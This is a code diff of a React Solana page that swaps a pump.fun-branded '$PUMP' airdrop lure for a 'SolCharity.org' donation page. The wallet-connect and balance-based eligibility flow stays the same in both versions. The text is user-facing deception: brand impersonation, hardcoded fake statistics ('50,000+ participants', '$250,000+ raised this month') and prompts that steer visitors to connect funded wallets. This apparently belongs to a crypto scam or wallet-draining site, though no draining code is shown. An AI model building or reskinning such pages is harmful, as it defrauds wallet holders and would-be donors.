@@ -104,10 +104,10 @@ const Index = () => {
           <div className="flex items-center gap-3">
             <img
               src={logoImage}
-              alt="Pill Logo"
+              alt="Charity Logo"
               className="h-8 w-8 object-contain"
             />
-            <span className="text-2xl font-bold text-white">pump.fun</span>
+            <span className="text-2xl font-bold text-white">SolCharity.org</span>
           </div>
           <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4">connect wallet</WalletMultiButton>
         </div>
@@ -120,14 +120,14 @@ const Index = () => {
           <div className="text-center space-y-4">
             <div className="space-y-3">
               <h1 className="text-5xl font-bold text-white">
-                Get Your Share Of
+                Help Us Make A Difference
               </h1>
-              <div className="text-4xl font-bold bg-gradient-to-r from-green-400 to-green-600 text-transparent bg-clip-text animate-gradient">
-                1,000,000 $PUMP
+              <div className="text-4xl font-bold bg-gradient-to-r from-blue-400 to-purple-600 text-transparent bg-clip-text animate-gradient">
+                Support Our Charity Campaign
               </div>
             </div>
             <p className="text-xl text-white/90 max-w-2xl mx-auto leading-relaxed">
-              Join exclusive airdrop and be part of the most exciting memecoin launch on solana. Early participants get bonus rewards and white listing access.
+              Your donation can change lives. Join our community of givers and help us support those in need. Every contribution matters, no matter how small.
             </p>
             {/* Added CenterWalletButton component */}
             <div className="pt-4">
@@ -141,7 +141,7 @@ const Index = () => {
               <div className="text-center space-y-4">
                 <p className="text-sm text-muted-foreground flex items-center gap-2 justify-center">
                   <Wallet className="w-4 h-4" />
-                  Connect your wallet to get $ pump
+                  Connect your wallet to donate
                 </p>
               </div>
             ) : (
@@ -149,7 +149,7 @@ const Index = () => {
                 {/* Eligibility Status */}
                 <div className={`bg-card/50 backdrop-blur-lg border border-border/50 rounded-xl p-6 text-center`}>
                   <p className={`text-2xl font-bold ${isEligible ? 'text-green-500' : 'text-red-500'}`}>
-                    {isEligible ? 'Eligible' : 'Not eligible connect with other wallet'}
+                    {isEligible ? 'Ready to Donate' : 'Insufficient balance for donation'}
                   </p>
                 </div>
 
@@ -162,23 +162,21 @@ const Index = () => {
                     className="w-full"
                     disabled={isProcessing}
                   >
-                    <svg className="w-6 h-6 mr-2" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                      <path d="M13 3L4 14H12L11 21L20 10H12L13 3Z" fill="currentColor" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
-                    </svg>
-                    Get $PUMP Now
+                    <Heart className="w-6 h-6 mr-2" />
+                    Donate Now
                   </Button>
                 )}
 
                 {/* Stats Section */}
                 <div className="flex justify-center items-center gap-8 mt-6">
                   <div className="text-center">
-                    <p className="text-3xl font-bold text-white">50,000+</p>
-                    <p className="text-xs text-muted-foreground uppercase tracking-wide">PARTICIPANTS</p>
+                    <p className="text-3xl font-bold text-white">10,000+</p>
+                    <p className="text-xs text-muted-foreground uppercase tracking-wide">DONORS</p>
                   </div>
                   <div className="text-center">
-                    <p className="text-3xl font-bold text-white">20x-80x <span className="text-green-500">82%</span></p>
-                    <p className="text-xs text-muted-foreground uppercase tracking-wide">PUMP</p>
-                    <p className="text-xs text-green-500 font-bold uppercase tracking-wide">CLAIMED</p>
+                    <p className="text-3xl font-bold text-white">$250,000+ <span className="text-green-500">raised</span></p>
+                    <p className="text-xs text-muted-foreground uppercase tracking-wide">DONATIONS</p>
+                    <p className="text-xs text-green-500 font-bold uppercase tracking-wide">THIS MONTH</p>
                   </div>
                 </div>
 
